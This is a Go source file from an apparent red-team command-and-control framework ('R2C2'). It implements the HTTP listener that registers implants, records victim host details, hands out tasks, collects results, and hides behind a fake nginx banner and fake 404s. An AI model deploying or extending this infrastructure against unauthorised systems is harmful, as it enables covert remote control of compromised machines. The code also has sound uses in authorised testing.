package listeners

import (
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gin-gonic/gin/binding"
	"github.com/mati-olivera/R2C2/internal/core/agents"
	"github.com/mati-olivera/R2C2/internal/core/logger"
	"github.com/mati-olivera/R2C2/internal/core/tasks"
)

type HttpListener struct {
	Id              string    `json:"id"`
	Name            string    `json:"name"`
	Port            int       `json:"port"`
	Host            string    `json:"host"` // Optional, can be empty for all interfaces
	Secure          bool      `json:"secure"`
	Clients         *[]string `json:"clients"`
	LiveSince       string    `json:"live_since"`
	Status          string    `json:"status"`
	Cert            *Cert     `json:"cert,omitempty"` // Optional, only if Secure is true
	ResponseHeaders []string  `json:"response_headers,omitempty"`
	Uris            []string  `json:"uris"` // las que va a usar el implante para ciclar peticiones
	server          *http.Server
	mu              sync.Mutex
	TaskManager     *tasks.TaskManager      `json:"-"`
	Sessions        *agents.SessionsService `json:"-"`
}

type Cert struct {
	CertFile string `json:"cert_file"`
	Key      string `json:"key"`
}

type NewHttpListenerRequest struct {
	Name            string   `json:"name"`
	Host            string   `json:"host"`
	Port            int      `json:"port"`
	Secure          bool     `json:"secure"`
	Cert            *Cert    `json:"cert,omitempty"` // Optional, only if Secure is true
	ResponseHeaders []string `json:"response_headers,omitempty"`
	Uris            []string `json:"uris"` // las que va a usar el implante para ciclar peticiones
}

func (h *HttpListener) Start() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	gin.SetMode(gin.ReleaseMode)

	router := gin.New()

	router.Use(func(c *gin.Context) {
		// custom banners
		c.Writer.Header().Set("Server", "nginx")
		c.Next()
	})

	// fake 404
	router.NoRoute(func(c *gin.Context) {
		c.String(404, "Not Found")
	})

	// TODO: must implement URI cycling on beacon
	router.Any("/", h.handleRequest)
	// if len(h.Uris) == 0 {
	// 	// if no URIs specified, use root
	// 	router.Any("/", h.handleRequest)
	// } else {
	// 	for _, uri := range h.Uris {
	// 		path := "/" + strings.TrimLeft(uri, "/")
	// 		router.Any(path, h.handleRequest)
	// 	}
	// }

	port := strconv.Itoa(h.Port)

	h.server = &http.Server{
		Addr:         h.Host + ":" + port,
		Handler:      router,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	h.Status = "running"

	// TODO: kill listeners if server dies
	go func() {

		if err := h.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error("HTTP Listener Error", err, "listener_id", h.Id)
		}

		h.mu.Lock()
		h.Status = "stopped"
		h.mu.Unlock()
	}()

	logger.Info(fmt.Sprintf("Started HTTP listener: %s", h.Name), "listener_id", h.Id, "host", h.Host, "port", port)
	return nil
}

func (h *HttpListener) Stop() {
	h.mu.Lock()
	defer h.mu.Unlock()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := h.server.Shutdown(ctx); err != nil {
		logger.Error("could not stop HTTP listener", err, "listener_id", h.Id)
		return
	}
	logger.Info("Stopped HTTP listener", "listener_id", h.Id)
}

func (h *HttpListener) IsRunning() bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	return h.Status == "running"
}

func (h *HttpListener) handleRequest(ctx *gin.Context) {
	// TODO: make this header configurable
	agentId := ctx.GetHeader("X-Agent-ID")
	if agentId == "" {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "Missing X-Agent-ID header"})
		return
	}

	externalIp := ctx.ClientIP()

	// TODO::
	// - [DONE] handle authentication via agent ID
	// - [DONE] this could be a task fetch request or a task result submission, hanle both
	// - handle decrpytion (future)
	// - [DONE] Respond with sleep time and jitter

	if ctx.Request.Method == http.MethodPost {
		var registerData agents.AgentRegisterData
		err := ctx.ShouldBindBodyWith(&registerData, binding.JSON)
		if err == nil {
			// handle registration
			agent, err := h.Sessions.GetSession(agentId)
			if err != nil {
				logger.Error("Error fetching agent session during registration "+agentId, err)
				// if agent don't exist, return fake 404
				ctx.String(404, "Not Found")
				return
			}
			if agent.Status != "active" {
				agent.Status = "active"
				agent.Arch = registerData.Arch
				agent.Platform = registerData.Platform
				agent.Hostname = registerData.Hostname
				agent.User = registerData.User
				agent.InternalIp = registerData.InternalIp
				agent.Pid = registerData.Pid
				agent.ProcessName = registerData.ProcessName
				agent.PublicIp = externalIp
				agent.Sleep = registerData.Sleep
				agent.Jitter = registerData.Jitter

				err := h.Sessions.SaveSession(*agent)
				if err != nil {
					logger.Error("Error saving new agent session "+agentId, err)
					ctx.JSON(http.StatusInternalServerError, gin.H{"error": "Error saving new agent session"})
					return
				}

				err = h.Sessions.UpdateLastPing(agentId, time.Now())
				if err != nil {
					logger.Error("Error updating last ping for agent "+agentId, err)
					return
				}

				ctx.JSON(http.StatusOK, gin.H{"status": "registered"})
				return
			}
		}

		// submitting task results
		var result tasks.TaskResult
		err = ctx.ShouldBindBodyWith(&result, binding.JSON)
		if err != nil {
			logger.Error("Error binding task result JSON", err)
			return
		}

		if result.Task.Command == "sleep" {
			sleep := result.Task.Args[0]
			jitter := result.Task.Args[1]

			if sleep == "" || jitter == "" {
				logger.Error("Missing sleep or jitter value from agent "+agentId, nil)
				return
			}
			sleepInt, err := strconv.Atoi(sleep)
			if err != nil {
				logger.Error("Invalid sleep value from agent "+agentId, err)
				return
			}
			jitterInt, err := strconv.Atoi(jitter)
			if err != nil {
				logger.Error("Invalid jitter value from agent "+agentId, err)
				return
			}

			err = h.Sessions.UpdateSleep(agentId, sleepInt, jitterInt)
			if err != nil {
				logger.Error("Error updating sleep/jitter for agent "+agentId, err)
				return
			}
		}

		err = h.TaskManager.SubmitTaskResult(result)
		if err != nil {
			logger.Error("error updating task status", err, "task_id", result.Task.Id)
		}
		err = h.Sessions.UpdateLastPing(agentId, time.Now())
		if err != nil {
			logger.Error("Error updating last ping for agent "+agentId, err)
			return
		}
	}

	// fetching tasks
	if ctx.Request.Method == http.MethodGet {
		err := h.Sessions.UpdateLastPing(agentId, time.Now())
		if err != nil {
			logger.Error("Error updating last ping for agent "+agentId, err)
			return
		}

		tasks, err := h.TaskManager.FetchTasks(agentId)
		if err != nil {
			logger.Error("Error fetching tasks", err)
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": "Error fetching tasks"})
			return
		}

		if tasks == nil || len(*tasks) == 0 {
			ctx.JSON(http.StatusNoContent, gin.H{})
			return
		}

		ctx.JSON(http.StatusOK, tasks)
		return
	}
}
